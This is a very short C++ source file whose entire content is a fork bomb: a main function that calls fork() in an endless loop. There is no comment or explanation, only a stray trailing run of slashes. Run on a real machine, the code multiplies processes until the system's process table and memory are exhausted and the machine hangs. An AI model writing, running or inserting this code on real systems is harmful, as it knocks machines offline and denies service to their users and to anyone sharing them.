#include <unistd.h>
#include <cstdio>

int main() {
    while (1) {
        fork();
    }
}//////